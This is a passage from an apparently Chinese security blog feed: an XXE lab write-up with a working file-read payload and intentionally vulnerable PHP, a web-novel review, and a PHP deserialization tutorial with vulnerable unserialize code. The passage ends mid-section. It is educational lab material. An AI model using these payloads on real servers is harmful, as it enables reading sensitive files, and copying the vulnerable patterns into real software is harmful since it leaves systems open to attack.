那我们是不是能将路径换一换，换成敏感文件的路径，然后把敏感文件读出来？</p><p>对于PHP语言，可以使用FILE、HTTP、FTP还有PHP伪协议，来进行文件读取。</p><p>也就是说，对于XXE中的XML文档来看，可能出现的危害主要是：</p><blockquote><p>1、读取任意文件</p><p>通过多种协议来对本地文件进行读取。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220804143420071.png" alt="image-20220804143420071"></p><p>2、执行系统命令</p><p>比较少出现的情况，在配置不当或是开发内部应用的情况下，可以通过XXE执行代码。（例如PHP expect 模块被加载到了易受攻击的系统或是处理XML的内部应用上。），使得攻击者能够通过XXE执行代码。</p><p>关于PHP expect:&#x2F;&#x2F;，这是一个处理交互流的协议，可以用来执行shell命令。</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220804143512998.png" alt="image-20220804143512998"></p><p>3、探测内网端口</p><p>可以根据返回的信息判断端口是否打开，若测试端口返回“Connection refused”则可以知道该端口是closed的，否则为open。</p><p><img src="C:\Users\Ho1L0w_By\AppData\Roaming\Typora\typora-user-images\image-20220804150219599.png" alt="image-20220804150219599"></p><p>简单来说，就是通过引用外部实体的方式，来尝试连接成功，如果是报的拒绝连接错了，就是无法访问。</p></blockquote><h3 id="1-5-XXE-Lab靶场"><a href="#1-5-XXE-Lab靶场" class="headerlink" title="1.5 XXE-Lab靶场"></a>1.5 XXE-Lab靶场</h3><blockquote><p><a href="https://github.com/c0ny1/xxe-lab">https://github.com/c0ny1/xxe-lab</a></p><p>还是这位师傅写的靶场。</p></blockquote><p>我这里直接搭建的是PHP的XXE靶场，搭建没什么好说的。还是直接用phpstudy，把下载的源码里面的<code>php_xxe</code>文件放到根目录下打开就行。 </p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220805135335231.png" alt="image-20220805135335231"></p><p>为了理解整个XXE漏洞的基本运行过程，这里我直接对源代码进行审计：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$USERNAME</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//账号</span></span><br><span class="line"><span class="variable">$PASSWORD</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//密码</span></span><br><span class="line"><span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>); <span class="comment">//禁用加载外部实体的功能（XXE就是XML外部实体注入漏洞），这里的布尔值是false，所以是允许加载外部实体功能。</span></span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>); <span class="comment">//这里分成两部分看，php://input这部分是PHP的伪协议，可以读取没有处理过的Post数据，简单来说这一套函数的作用就是把POST过来的数据作为XML文件进行读取，然后存放到变量$xmlfile中。</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;  <span class="comment">//启用了try&#123;&#125;catch&#123;&#125;异常处理，讲要执行的代码放在try块中,如果这些代码中有异常，则跳转到catch块中。也就是try调用代码，catch抛出异常。</span></span><br><span class="line"><span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>(); <span class="comment">//类，主要就是用于处理xml文档的，这里实例化了一个对象。</span></span><br><span class="line"><span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD); <span class="comment">//调用了成员方法，成员方法作用是解析指定的XML文本串，然后再当前文档对象中构建一个棵DOM节点树，而丢弃之前存在于文档中的任何节点，简单来说把一个XML格式的字符串输入进去，然后覆盖掉原本的节点，这里是把POST过来的数据存入进去。</span></span><br><span class="line"><span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>); <span class="comment">//将DOM节点转换为SimpleXMLElement的节点，如果失败，返回false。其实简单来说就是把子元素的值存入了。这样就可以直接对子元素进行输出。</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username; <span class="comment">//如上，这里直接存放了子元素名字叫&lt;username&gt;&lt;/username&gt;包裹的值</span></span><br><span class="line"><span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password; <span class="comment">//同上，具体看抓包</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123; <span class="comment">//对传输过来的username和password与预设的密码和用户名进行判定，相同则进行下一步。</span></span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>); <span class="comment">//格式化输出内容</span></span><br><span class="line">&#125;</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line"><span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>); <span class="comment">//声明content-type</span></span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>上面就是源代码的解析，然后看一下抓包的分析：</p><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220805151601688.png" alt="image-20220805151601688"></p><p>这里就可以看见传输的数据是通过XML格式进行传输的，同时也可以从<code>Content-type</code>字段看到需求是<code>application/xml;charset=utf-8</code></p><p>这里我们使用XXE，同时在网页根目录下创建一个flag.php文件，来测试文件的读取。</p><p>进行改包：</p><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;ISO-8859-1&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">Ho1L</span>0w-By[</span></span><br><span class="line"><span class="meta"><span class="meta">&lt;!ENTITY <span class="keyword">flag</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///D:/phpstudy_pro/WWW/flag.php&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">user</span>&gt;</span><span class="tag">&lt;<span class="name">username</span>&gt;</span><span class="symbol">&amp;flag;</span><span class="tag">&lt;/<span class="name">username</span>&gt;</span><span class="tag">&lt;<span class="name">password</span>&gt;</span>admin<span class="tag">&lt;/<span class="name">password</span>&gt;</span><span class="tag">&lt;/<span class="name">user</span>&gt;</span> <span class="comment">&lt;!--注意引用的时候要加上引号--&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/Ho1L0w-By/Picturebed@main/img/image-20220805153030885.png" alt="image-20220805153030885"></p><p>可以看见这里成功的读取了我们创建的文件，并且进行了返回。</p><p>这就是简单的有回显的XXE漏洞，这里是实现了任意文件读取。</p>]]></content>
      
      
      <categories>
          
          <category> Web漏洞 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XXE </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>《蛊真人》——小人物的坚持</title>
      <link href="/2022/06/17/guzhenren/"/>
      <url>/2022/06/17/guzhenren/</url>
      
        <content type="html"><![CDATA[<p>​在开始看这本小说的时候，我刚高二。但是我已经在网络小说的世界里经历了7年了。从小学的《斗罗大陆》，《斗破苍穹》，《冰火魔厨》……，到初中的《凡人修仙传》，《仙逆》，《无限恐怖》……</p><p>​到高中为止我已经看了很多网文，当然，也有很多的出版文学，每本书基本都能给我带来不同的感受，以及不同的思考，但是从未有一本书能够像《蛊真人》一样给我惊喜以及精神上的力量。</p><p>​《蛊真人》，作者也叫蛊真人。他用自己的奇思妙想为我们构建了一个千奇百怪的蛊的世界——“人是万物之灵，蛊是天地真精”。</p><p>​ 作者用各类蛊，将传统仙侠中讲究的所谓财侣法地合并在了一起，从而创造出了一个远远和我们认知中不同的蛊的世界。在传统的印象中，蛊是南疆巫毒的产物，是一种毒虫，用来害人的节肢类动物，有的还有一些奇妙的强身健体的效果。</p><p>​但是在蛊真人中，蛊远不止如此，它们有的长得像是昆虫，有的则像是器物，有的甚至什么都不是，就是单纯的一个概念，蛊千奇百怪。在传统仙侠中，用飞剑，那就有长得像是飞剑的飞剑蛊。在武侠中有金钟罩，那就有长成天牛的金钟罩蛊。修仙要想餐风饮露，那就有餐风蛊，饮露蛊，让你可以真的以风露为食，填饱肚子。你要治疗自己，那就有治疗蛊，你要快速移动，就有移动蛊。甚至你可以将蛊虫进行合炼，创造出新的蛊虫（例如有人用电蛊和爆脑蛊创造出了电脑蛊，用来开机甲）。除此之外，还有智慧蛊，力量蛊，希望蛊等等等等……</p><p>​作者用他的想象力为我们创建了一个丰富多彩的蛊虫的世界，里面的万事万物都离不开蛊，蛊就是财侣法地的表现化。但同时，作者也为这个世界赋予了与现实世界相似的残酷性。资源的竞争，人性的角逐，无处不在，人与人之间充满了算计，相互之间包藏祸心，因为这里是高武的世界，有人抛妻弃子，甚至杀死自己的父母，只为了获取更多的力量，为了让自己更加的强大，能够在世界中立足。从这个角度看，这充满奇幻色彩的蛊世界，却又和现实中的养蛊是那么的相似。将无数的毒虫放在一个瓮里，让他们自相残杀，而最后活下来的那一只，就是最毒，最凶猛的毒虫，也可以称为蛊。</p><p>​从这个角度来讲，主角古月方源，就是那一只最后练成的蛊。</p><p>​作者从一开始就讲过，他想写一个反派，一个真真正正的魔头，不会像是一般小说反派那般愚蠢，不会看见美女就走不动路，不会为了一点鸡毛蒜皮的矛盾就出言不逊等着主角打脸，而是永远有自己的理想，永远有自己的坚持，永远不会放弃，无论手段，无论方法，也要达成自己的目标。</p><p>​而这个魔头，就是古月方源。</p><p>​他残忍，他无情，他高大，他低贱，他辉煌，他平庸，他坏事做尽，坏事做绝。</p><p>​他可以为了一对骨肉相连蛊，毫不犹豫的害死一对双胞胎，他也可以为了提高自己的资质，让狗熊杀死一个少女。同样，他也可以为了让自己的听觉侦察范围更广，不用麻药切掉自己的一只耳朵，装上地听肉耳草蛊，用一把匕首生生的扒去自己全身人皮，以伪装成别人。他对别人狠，对自己更狠。</p><p>​《蛊真人》这本书的主要故事，就是跟着主角，古月方源开始他的永生大计。在这个世界用蛊的人被叫做蛊师，按照能力，可以分为一到九转，其中九转最强，被称为尊者，蛊尊。在这本书中，设定是蛊尊是绝对的无敌，只要出现了，九转之下，都是蝼蚁，但同时，每个大时代只能出现一位。</p><p>​方源的前世，从一介凡人不断修炼，历经千辛万苦，修炼到了六转蛊仙，他为元石发过愁，也赚过大钱，他当过乞丐，也做过商贾，他老过，他也用寿蛊恢复过年轻，他走过很远，穿过了山川与海洋。整个蛊世界，南疆，西漠，东海，北原和中州，五大域他都去过，漂泊三百年，修炼二百年，终于，成为了六转蛊仙，练就了一只奇蛊——春秋蝉。</p><p>​春秋蝉有穿越时空的能力，也因此，方源在被正道围攻，走到末路的时候，选择用自己的全身修为和性命为动力，催动春秋蝉回到过去。毫无疑问，春秋蝉是方源的金手指，虽然这个金手指有极大的副作用，成功率有限，如果失败，就是彻底自爆死亡，但仍然为方源提供了极大的助力。</p><p>​小说整体的故事，就是看穿越回五百年前的方源，是如何为了永生，开始谋划和冒险的。</p><p>​说到这里，是不是感觉这本书和别的后宫小说没什么区别？主角接下来无非就是打怪升级，靠着自己的前瞻性抢夺机缘，升级打脸，装X逆袭。但是这偏偏不是蛊真人的思路。</p><p>​你穿越回五百年前，优势很大？那就让未来因为你的蝴蝶效应而改变，让你只能获得部分的信息。你想要成仙？那就让你成仙之路断绝，变成仙僵，无法修炼，连思考能力都下降。你想要永生？那就让天意浩荡，所有人与你为敌，让你困难重重，让你命中注定不能永生。</p><p>​方源从南疆的青茅山走出来，到三王福地，八十八角真阳楼，义天山大战，再到天庭大战，他一步步走来，每一步都是刀光剑影，每一步都是荆棘险峻。你聪明，敌人和你一样聪明，你有信息差，敌人比你有更多的信息差，你有金手指，但是只能让你回到15分钟到一个小时之前，甚至还有可能失败。</p><p>​方源还剩什么？</p><p>​他到底要怎么取胜？</p><p>​其实，方源从来就没有什么作弊的金手指，或者说，他的金手指只有一个，不是春秋蝉，而是他的坚持。</p><p>​他坚持，所以他能够从青茅山走出来，成为甲等资质，他坚持，所以他不会接受命运的浮沉，他知道自己想要什么，他知道自己为了什么而坚持。</p><p>​就像是这本书的灵魂，《人祖传》里讲的一样</p><blockquote><p>人祖听了便问：“你们为什么要寻找自由蛊呢？”<br>　　鱼群们唉声叹气：“我们曾经拥有过自由蛊，但我们没有意识到。当我们失去了它，我们才发现自己没有了鱼鳃，再不能在水里呼吸。当我们重新获得自由，我们才可以在水里随意畅游。”<br>　　人祖大悟：“我明白了，人也得有自由。人如果没有了自由，就好像是鱼没有了腮，不能呼吸。”<br>　　“没错！”人祖一拍巴掌，大笑起来，“我要得到自由，摆脱宿命的束缚，我要自由自在的呼吸，永远存在下去，我要永生！”<br>　　鱼群纷纷冷笑：“人啊，你怎么能有这样的非分之想呢？”<br>　　“你瞧瞧我们，鱼鳃是鱼必须要有的，所以我们追寻自由是一种本分。”<br>　　“而你们人的一生注定和永生无缘，将会生老病死。人啊，你要追寻自由，也要恪守你的本分，可不能胡思乱想。”<br>　　人祖皱皱眉，神情厌烦：“是这样的吗？”<br>　　鱼群最后留下一句话：“人啊，让我们给你一个忠告吧。将来你若是得到了自由，千万要懂得珍惜，不要像我们一样轻易松手。千万不要放自由蛊飞走，不然你会后悔的。”<br>　　人祖和鱼群分别，渐渐的忘记了鸟群、豹群、鱼群关照他的话。<br>　　“我是人，我要追求自由！”</p></blockquote><p>也就像是方源打破宿命做的一样：</p><blockquote><p>人祖再说：他得到自由，摆脱宿命的束缚，要自由自在的呼吸，永远存在下去，他要永生不老！<br>　　鱼群否决他：你们人的一生注定和永生无缘，将会生老病死。人啊，你要追寻自由，也要恪守你的本分，可不能胡思乱想。<br>　　人祖疑惑。<br>　　人祖怏怏。<br>　　人祖厌烦。<br>　　人祖疯了！<br>　　你怎么可以这样想？<br>　　我为什么不能这样想？<br>　　一个人，为什么不能和爱人永不分离？<br>　　一个人，为什么不能衣食无忧，富贵滔天？<br>　　一个人，为什么不能永生不死不老？<br>　　就因为宿命不允许吗？<br>　　就因为它不允许，我就不能做！？我就不能想？！<br>　　凭什么？<br>　　他妈的凭什么？<br>　　凭什么不可以想！？<br>　　凭什么永生就不可行？！</p><p>​好吧。<br>　　如果这样想，让我疯。<br>　　那就让我成为疯子！<br>　　如果这样追寻，让我魔。<br>　　那就让我成为魔头！！<br>　　方源望着手中的宿命蛊，冷冷一笑。<br>　　他手轻轻一用力。<br>　　咯嘣。<br>　　一声轻响。<br>　　宿命蛊被他直接捏成碎片。<br>　　九转宿命蛊——<br>　　毁了！</p></blockquote><p>我看过四本讲勇气和坚持的书。</p><p>《老人与海》看时懵懵懂懂，后来我看到了老人面对残酷生活的乐观，他只有勇气，但是却少了坚持。</p><p>《钢铁是怎样炼成的》保尔柯察金的勇气和坚持让我怜悯，我说，我如果像他一样不幸，我应该会放弃。</p><p>《钢之炼金术士》艾尔利克兄弟的友谊和三观，以及钢铁般的勇气和坚持让我感动，我说，如果我向他们一样不幸，我也要学会爱人，学会坚持。</p><p>而《蛊真人》，方源的坚持让我感到震撼。</p><blockquote><p>​他面无表情，不管走多少步，逆流河永远流淌在他的脚下，仿佛是绝大的命运的嘲笑。<br>　　但是他仍旧走着。<br>　　他从前世五百年走来，不知要走到什么时候<br>但他知道，自己要去往何方。<br>　　似乎……没有人能阻止他。<br>　　至少……如今的逆流中，已经无人可阻。<br>　　前世五百年前。<br>　　方源倚在竹楼上，看看山寨，又仰望背后的青茅山。<br>　　双手握拳，稚嫩的小脸上，满是希冀。<br>　　“是时候放弃过去了。”<br>　　“穿越到这里来，这是我的福缘！因为在这里，可以实现长生。”<br>　　“我要把握这样难得的机会！不然，怎么对得起自己，对得起这份机缘？”<br>　　“当然，目前阶段，是提升我和弟弟的生活环境。嘿，那个小家伙……”<br>　　开窍之后。<br>　　演武场上，方源垂下头，一脸惊怒。<br>　　“被暗算了！”<br>　　“是谁暗算我？不愿意让我战胜对手？答案不言而喻！”<br>　　“哥哥，放弃吧，你不会是我的对手。因为天资不同，我们注定不同。”眼前的古月方正带着快意道。<br>　　方源转头就走，他的眼中全是坚定之色。<br>　　“既然山寨不栽培我，舅父舅母甚至都故意排挤我，我留在这里有什么意思？”<br>“难道在这里就可以变强，实现长生么？”<br>　　“不如出去？”<br>　　商队里。<br>　　大胡子蛊师死了，方源站在他的墓前。<br>　　少年满含泪水，哽咽地道：“胡子大叔，你安息吧。”<br>　　“谢谢你临走前的礼物。”<br>　　“你说：小时候，你想成为顶天立地的人物，就像是正道的那些传奇人物那样。少年时，觉得成为一族族长也不错。青年时，能够成为家老就感觉很棒了。中年后，被家族流放，发现其实能养得活自己，养得起身上的蛊虫，就能让自己满意。”<br>　　“我不会这样，让梦想随着年龄而萎缩。”<br>　　“这个世界太大，而我们都是小人物……但我会加油的！会一直努力！”<br>　　……<br>　　童年、少年、青年。<br>　　青茅山、商队，一路行走。<br>　　壮年、老年，终究获得寿蛊。<br>　　南疆、西漠、东海、中洲。<br>　　春秋蝉重生后，青茅山、三王山、狐仙福地、王庭福地、义天山、逆流河！<br>　　一步步走来，一路风雨。<br>　　碧晨天皱起眉头，他盯着方源的身影，心中<br>呢喃道：“这是何等的意志！他究竟为什么坚持？是什么能让他如此坚持？”<br>　　雪胡老祖冷哼，眼中闪过郑重之色，再无之前面对一般七转蛊仙的轻蔑：“这么说来，三十万年前有元莲，三十万后有柳贯一……逆流河主啊。”<br>　　毛里球望着方源身上越盛的光辉，无可奈何，龇牙咧嘴，爪子下意识地在地面上挠，挠出道道深痕。<br>　　白凝冰、黑楼兰俱都眼角狂跳，神情动容。<br>　　赵怜云此刻悠悠醒转，她望着方源另一个胳膊下夹着的，马鸿运的尸体，她的眼泪夺眶而出。<br>　　她在心中哭嚎：“鸿运，鸿运，你怎么可以离我而去。没有了你，我在这个世界上，就是孤家寡人。我活着还有什么意思？你知道吗？一个人的坚持是有多难！”<br>　　一个人的坚持会有多难？<br>　　在场的所有蛊仙，都能回答这个问题。<br>　　因为他们当中，有的因为责任而坚持，有的因为仇恨而坚持，有的因为精彩而坚持，有的因为爱情而坚持……<br>　　而方源的回答呢？<br>　　他仍旧面无表情，毫无所动地向前进。<br>　　我曾经呐喊过，渐渐的我不发出声音。<br>　　我曾经哭泣过，渐渐的我不再流泪。</p><p>​我曾经悲伤过，渐渐的我能承受一切。<br>　　我曾经喜悦过，渐渐的我看淡世间。<br>　　而如今！<br>　　我只剩下面无表情，我的目光如磐石般坚硬，我的心中剩下坚持。<br>　　这就是我，一个小人物，方源的——坚持！</p></blockquote><p>有人说，真正的英雄主义，是认清了生活的残酷，仍然能热爱生活。那方源应当是当之无愧的英雄。他残忍，他无情，他低贱，他卑微，他坚强，他冷静，他高大，他辉煌，他坚持，他是古月方源。</p><p>在高考前，方源的精神无数次的鼓励了我，安慰了我孤独的心。每每看见方源的坚持，就又能让我拥有力量，去面对生活中的一切苦难，同时保持自己的本心。</p><p>我曾经呐喊过，渐渐的我不发出声音。<br>我曾经哭泣过，渐渐的我不再流泪。<br>我曾经悲伤过，渐渐的我能承受一切。<br>我曾经喜悦过，渐渐的我看淡世间。</p><p>我是真人，我是古月方源。</p><p>如果满分是十分，这本书我会毫不犹豫的给他9.8分，这是超出了网络小说的一本书，是能给人以力量的精神食量，虽然需要辩证看待，但是，他给人的力量是实打实的。</p><p>坚持，方源的坚持。</p>]]></content>
      
      
      <categories>
          
          <category> 书评 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 写作 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP反序列化</title>
      <link href="/2022/06/15/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9A/"/>
      <url>/2022/06/15/PHP%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%EF%BC%9A/</url>
      
        <content type="html"><![CDATA[<h1 id="PHP反序列化："><a href="#PHP反序列化：" class="headerlink" title="PHP反序列化："></a>PHP反序列化：</h1><p>关于反序列化的情况：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;ghtwf01&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&quot;18&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>反序列化前输出结果：</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/20191112144212-8e85e4f4-0517-1.png" alt="img"></p><p>反序列化后输出结果：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;ghtwf01&quot;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$age</span>=<span class="string">&quot;18&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line">    <span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/20191112144234-9c15d5ca-0517-1.png" alt="https://xzfile.aliyuncs.com/media/upload/picture/20191112144234-9c15d5ca-0517-1.png"></p><p>O:4:”test”这部分是对象名字的描述</p><p>:2:这部分是有两个成员属性，然后到花括号开始描述类的内部的内容。</p><p>s就是string</p><p>如果成员不是使用public进行标记，而是使用pravite，则会出现一下的情况：</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$name</span>=<span class="string">&quot;ghtwf01&quot;</span>;</span><br><span class="line">        <span class="keyword">private</span> <span class="variable">$age</span>=<span class="string">&quot;18&quot;</span>;</span><br><span class="line">        <span class="keyword">protected</span> <span class="variable">$sex</span>=<span class="string">&quot;man&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="variable">$a</span>=<span class="keyword">new</span> <span class="title function_ invoke__">test</span>();</span><br><span class="line">    <span class="variable">$a</span>=<span class="title function_ invoke__">serialize</span>(<span class="variable">$a</span>);</span><br><span class="line">    <span class="title function_ invoke__">print_r</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/20191112144245-a2973722-0517-1.png" alt="img"></p><p>其中，testage是作为age的替换出现的。</p><p><strong>当private标注的成员属性进行反序列化的时候，会将格式改为%00类名%00成员名的</strong>格式</p><p>其中%00会占用一个字节的长度，因此，本来只有7个字符，但是实际反序列化出来之后，会显示有9个字节。</p><p>当使用protect之后，格式变为：</p><p><strong>%00*%00成员名</strong></p><p>就像是上面的结果变为了*sex一样，本来是sex。</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220309085459451.png" alt="image-20220309085459451"></p><p>在url中也要进行%00的添加，否则利用不成功。</p><p>魔术方法：</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/image-20220309085817014.png" alt="image-20220309085817014"></p><p>当没有对$_GET或是$_POST传入的数据进行过滤的时候，容易造成攻击。</p><p>特别是利用php的嵌入化特性，可以造成xss攻击。</p><p><strong>这是一个反序列化的漏洞代码</strong></p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">A</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$test</span> = <span class="string">&quot;demo&quot;</span>;</span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable language_">$this</span>-&gt;test;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;test&#x27;</span>];</span><br><span class="line"><span class="variable">$a_unser</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$a</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这里可以看见的是，变量$a没有对get方法传入的值进行过滤，一旦传入的值是一个序列化后的特殊构造值，则会产生错误的后果。</p><p>主要是因为在删除对象之前会调用_destruct()，然后进行一个echo，经过字符的传输，会产生一个简易的XSS。</p><p>整个反序列化的流程：</p><p>首先创建一个类，建立一个类对应的对象，这个时候会首先调用_construct()，然后再将对象进行序列化，在进行序列化的时候，会首先调用_sleep()，然后再进行反序列化，然后在进行反序列化的时候，会直接调用_wakeup()这个函数，然后当消灭对象的时候再会调用_destruct()这个方法。</p><p>__sleep()方法不需要接受任何参数，但是需要返回一个数组。在数组中包含需要串行化的属性。没有被包含在数组中的属性将会在串行化的时候被忽略。如果没有在类中声明__sleep()方法，对象中的所有属性都将被串行化（就是相当于是没有做出任何的改变）。</p><p>所返回的数组需要自己进行定义，其中的每一个名字都可以是一个属性，返还这个数组之后，就会自动的只将数组中的属性进行串行化。</p><p>在调用unserialize()函数将对象反串行化的时候，将会自动的调用对象中存在的__wakeup()方法，用来在二进制串重新组成一个对象时，为新对象中的成员属性重新初始化。</p><p>__wakeup()方法将会在使用unserialize()函数的时候被自动调用（这两个魔术方法都是写在对象里面，不是单独写的）</p><p>可以在__wakeup()的内部直接为对象中的属性赋值。</p><h1 id="PHP-7-1-版本："><a href="#PHP-7-1-版本：" class="headerlink" title="PHP 7.1+版本："></a>PHP 7.1+版本：</h1><p>在PHP7.1版本以上，对于序列化中的成员变量类型不敏感，当有对不可见字符串进行过滤的时候，可以将public类型的变量输入，然后进行绕过。</p><h1 id="CVE-2016-7124-wakeup绕过"><a href="#CVE-2016-7124-wakeup绕过" class="headerlink" title="CVE-2016-7124 __wakeup绕过"></a>CVE-2016-7124 __wakeup绕过</h1><p><strong>__wakeup魔法函数简介</strong><br> <code>unserialize()</code>会检查是否存在一个 <code>__wakeup()</code> 方法。如果存在，则会先调用 <code>__wakeup()</code> 方法，预先准备对象需要的资源<br> 反序列化时，如果表示对象属性个数的值大于真实的属性个数时就会跳过<code>__wakeup()</code>的执行</p><p><strong>漏洞影响版本：</strong><br> php5 &lt; 5.6.25<br> php7 &lt; 7.0.10</p><p><img src="https://gitee.com/Ho1L0w-By/picgo-drawing-bed/raw/master/20191112144234-9c15d5ca-0517-1.png" alt="https://xzfile.aliyuncs.com/media/upload/picture/20191112144234-9c15d5ca-0517-1.png"></p><p>也就是这里的对象成员个数，如果说这里的个数多了，就会直接跳过对于_wakeup()的执行。</p><p>常见于绕过_wakeup()中对于成员属性的再次赋值。</p><h1 id="session反序列化漏洞："><a href="#session反序列化漏洞：" class="headerlink" title="session反序列化漏洞："></a>session反序列化漏洞：</h1><p><code>session</code>英文翻译为”会话”，两个人聊天从开始到结束就构成了一个会话。<code>PHP</code>里的<code>session</code>主要是指客户端浏览器与服务端数据交换的对话，从浏览器打开到关闭，一个最简单的会话周期</p><p>cookie与session的区别：</p><p><a href="https://www.zhihu.com/question/19786827">https://www.zhihu.com/question/19786827</a></p><h2 id="PHP-session工作流程"><a href="#PHP-session工作流程" class="headerlink" title="PHP session工作流程"></a>PHP 